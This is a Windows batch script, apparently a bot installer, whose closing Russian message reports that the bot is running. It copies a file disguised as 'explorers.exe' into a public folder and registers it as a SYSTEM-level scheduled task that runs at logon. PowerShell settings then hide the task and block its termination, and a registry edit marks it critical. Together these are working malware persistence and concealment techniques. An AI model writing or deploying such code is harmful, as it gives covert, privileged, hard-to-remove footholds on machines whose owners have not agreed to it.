```bat
@echo off
copy /Y "%~dp0explorers.exe" "C:\Users\Public\explorers.exe"

schtasks /Create /TN "explorers" /TR "C:\Users\Public\explorers.exe" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F

powershell -Command "$t = Get-ScheduledTask -TaskName 'explorers'; $t.Settings.Hidden = $true; $t.Settings.AllowHardTerminate = $false; $t.Settings.Priority = 0; $t.Settings.StopIfGoingOnBatteries = $false; $t.Settings.DisallowStartIfOnBatteries = $false; Set-ScheduledTask -TaskName 'explorers' -Settings $t.Settings"

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\explorers" /v "Critical" /t REG_DWORD /d 1 /f

schtasks /Run /TN "explorers"

echo Готово. Бот запущен.
pause
```

---